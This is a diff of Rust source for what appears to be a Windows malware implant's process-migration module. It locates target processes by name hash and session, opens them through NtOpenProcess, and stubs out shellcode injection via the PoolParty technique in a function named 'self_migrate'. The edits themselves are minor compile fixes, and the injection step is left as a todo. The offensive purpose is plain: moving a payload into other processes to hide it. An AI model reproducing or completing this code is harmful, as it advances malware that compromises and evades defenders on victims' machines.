@@ -42,8 +42,8 @@ unsafe fn free_memory(mut buffer: *mut c_void) { unsafe {
 }}
 
 unsafe fn find_processes_by_hash(target_hash: u32, required_session: u32) -> [usize; 4] { unsafe {
-    let result = [0usize; 4];
-    let count = 0usize;
+    let mut result = [0usize; 4];
+    let mut count = 0usize;
 
     // Allocate buffer for NtQuerySystemInformation(SystemProcessInfomration = 5)
     let mut buffer_size: u32 = 1024 * 256; // 256KB initial
@@ -51,7 +51,7 @@ unsafe fn find_processes_by_hash(target_hash: u32, required_session: u32) -> [us
     let mut return_length: u32 = 0;
 
     // get our PID to avoid self injection
-    let _out_pid = get_own_pid();
+    let our_pid = get_own_pid();
 
     loop { 
         let mut size = buffer_size as usize;
@@ -132,7 +132,7 @@ unsafe fn find_processes_by_hash(target_hash: u32, required_session: u32) -> [us
     result
 }}
 
-unsafe fn open_process(pid: usize) -> Option<HANDLE> {
+unsafe fn open_process(pid: usize) -> Option<HANDLE> { unsafe {
     let mut handle: HANDLE = null_mut();
 
     let mut client_id = ClientID {
@@ -162,7 +162,7 @@ unsafe fn open_process(pid: usize) -> Option<HANDLE> {
         debug!("[MIGRATE] NtOpenProcess failed: 0x{:08X}", status);
         None
     }
-}
+}}
 
 
 
@@ -185,7 +185,7 @@ pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
         for &pid in pids.iter().filter(|&&p| p != 0) {
             debug!("[MIGRATE]   Attempting PID {}", pid);
 
-            let handle = match open_process(pid) {
+            let _handle = match open_process(pid) {
                 Some(h) => h,
                 None => {
                     debug!("[MIGRATE]   Failed to open PID {}", pid);
@@ -195,7 +195,7 @@ pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
 
             // TODO: PoolParty + MirrorGate
             debug!("[MIGRATE] Injecting via PoolParty into PID {}", pid);
-            let success = todo!();
+            let _success = todo!();
 
         }
     }
